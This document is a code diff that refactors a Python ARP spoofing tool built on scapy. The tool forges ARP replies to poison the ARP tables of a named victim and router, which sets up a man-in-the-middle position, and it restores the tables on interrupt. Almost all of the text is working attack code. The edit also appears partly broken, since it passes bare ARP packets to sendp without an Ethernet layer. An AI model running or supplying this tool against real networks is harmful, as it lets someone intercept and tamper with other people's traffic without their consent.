@@ -1,7 +1,11 @@
-# arpSpoofer.py
-import sys
+#!/usr/bin/env python3
+"""
+This is a script that performs ARP spoofing on a target machine.
+"""
 
-from scapy.all import *
+import argparse
+
+from scapy.layers.l2 import ARP, getmacbyip, sendp
 from termcolor import *
 
 
@@ -12,15 +16,15 @@ class ArpSpoofer:
         self.victim_mac = getmacbyip(victim_ip)
         self.router_mac = getmacbyip(router_ip)
 
-    def arp_spoof(dest_ip, dest_mac, source_ip):
+    def arp_spoof(self, dest_ip, dest_mac, source_ip):
         packet = ARP(op="is-at", hwsrc=dest_mac, psrc=dest_ip, pdst=source_ip)
-        send(packet, verbose=False)
+        sendp(packet, verbose=False)
 
-    def arp_restore(dest_ip, dest_mac, source_ip, source_mac):
+    def arp_restore(self, dest_ip, dest_mac, source_ip, source_mac):
         packet = ARP(
             op="is-at", hwsrc=source_mac, psrc=source_ip, hwdst=dest_mac, pdst=dest_ip
         )
-        send(packet, verbose=False)
+        sendp(packet, verbose=False)
 
     def start_spoofing(self):
         print("Sending spoofed ARP packets")
@@ -30,30 +34,31 @@ class ArpSpoofer:
 
     def stop_spoofing(self):
         print("Restoring ARP Tables")
-        arp_restore(self.router_ip, self.router_mac, self.victim_ip, self.victim_mac)
-        arp_restore(self.victim_ip, self.victim_mac, self.router_ip, self.router_mac)
-
-
-def main():
-    try:
-        spoofer = ArpSpoofer(sys.argv[1], sys.argv[2])
-    except IndexError:
-        print(
-            colored(
-                f"This ARP spoofer requires two commandline arguments, the victim IP address and the router IP address.\n",
-                "red",
-                "on_grey",
-                ["bold"],
-            )
+        self.arp_restore(
+            self.router_ip, self.router_mac, self.victim_ip, self.victim_mac
         )
-        return
-
-    try:
-        spoofer.start_spoofing()
-    except KeyboardInterrupt:
-        spoofer.stop_spoofing()
-        quit()
+        self.arp_restore(
+            self.victim_ip, self.victim_mac, self.router_ip, self.router_mac
+        )
 
 
 if __name__ == "__main__":
-    main()
+    parser = argparse.ArgumentParser(description="ARP Spoofer")
+    parser.add_argument(
+        "--victim-ip", help="The IP address of the victim", required=True
+    )
+    parser.add_argument(
+        "--router-ip", help="The IP address of the router", required=True
+    )
+    args = parser.parse_args()
+
+    try:
+        spoofer = ArpSpoofer(args.victim_ip, args.router_ip)
+        spoofer.start_spoofing()
+
+    except Exception as e:
+        print(colored(e, "red"))
+
+    except KeyboardInterrupt:
+        spoofer.stop_spoofing()
+        quit()
